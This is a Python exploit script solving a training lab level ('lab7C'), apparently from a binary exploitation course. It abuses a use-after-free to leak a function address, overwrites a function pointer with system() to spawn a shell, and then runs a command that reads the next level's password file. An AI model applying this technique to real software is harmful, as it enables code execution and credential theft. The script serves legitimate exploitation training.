#!/usr/bin/python
# coding: utf-8


'''
Exploit for level lab7C
'''


#   Exploitation: This level can be exploited through a UAF bug. When printing
# the contents of the structure, the program doesn't check whether the struc-
# ture at the index selected by the user was previously free'd from the heap.


import subprocess
import threading
import time


# ****** IMPORTANT ******
# This value depends on how the binary was compiled. You can check it with
# gdb to see if it correspond with yours (print small_str - system). If not,
# please consider replacing it here.
systemoff = 0x19da37  # Offset of system() from small_str()


def handleout(p, stuff):
    '''
    Handles the output of the child process.
    '''
    stage1 = False
    flag = False
    while p.poll() is None:
        buf = p.stdout.readline()
        if not stage1:
            n = buf.find('not 1337')
            if n >= 0:
                stuff['leak'] = buf[n+0x11:]
                stage1 = True
        if not flag:
            n = buf.find('flag:')
            if n >= 0:
                stuff['flag'] = buf[n+0x5:]
                flag = True
                continue  # Don't print this line
        print buf,


if __name__ == '__main__':
    stuff = {'leak': '', 'flag': ''}
    p = subprocess.Popen('/levels/lab07/lab7C',
                         stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    reader = threading.Thread(target=handleout, args=(p, stuff))
    reader.daemon = True
    reader.start()

    try:
        p.stdin.write('2\n1\n')  # Allocate a number
        p.stdin.write('4\n')  # Free it to force the allocator to recycle space
        p.stdin.write('1\n/bin/sh\n')  # Allocate a string
        # Call small_num() (allocated before) to leak small_str()'s address
        p.stdin.write('6\n1\n')

        while not stuff['leak']:
            pass  # Wait for the leak

        leak = int(stuff['leak'])
        print '[+] Leaked address::0x%x' % int(stuff['leak'])
        print '[+] system() @ 0x%x' % (leak - systemoff)

        # Free the previous structure, then allocate a new number structure.
        # This will overwrite the address of the function to be called when
        # option 5 is selected. Just put a number that equals the address of
        # system() and see what it does!
        p.stdin.write('3\n')
        p.stdin.write('2\n%d\n' % (leak - systemoff))
        p.stdin.write('5\n1\n')  # Call system() and enjoy the shell
        time.sleep(0.25)
        p.stdin.write('echo "flag:$(cat /home/lab7A/.pass)"\n')

        while not stuff['flag']:
            pass  # Wait for the reader to collect the flag

        print '[+] flag : %s' % stuff['flag']

        # Uncomment this to keep the shell
        # while True:
        #    p.stdin.write(raw_input('(shell) ')+'\n')
        #    time.sleep(0.25)
    except KeyboardInterrupt:
        print '[+] Ctrl-C requested, shutting down...'
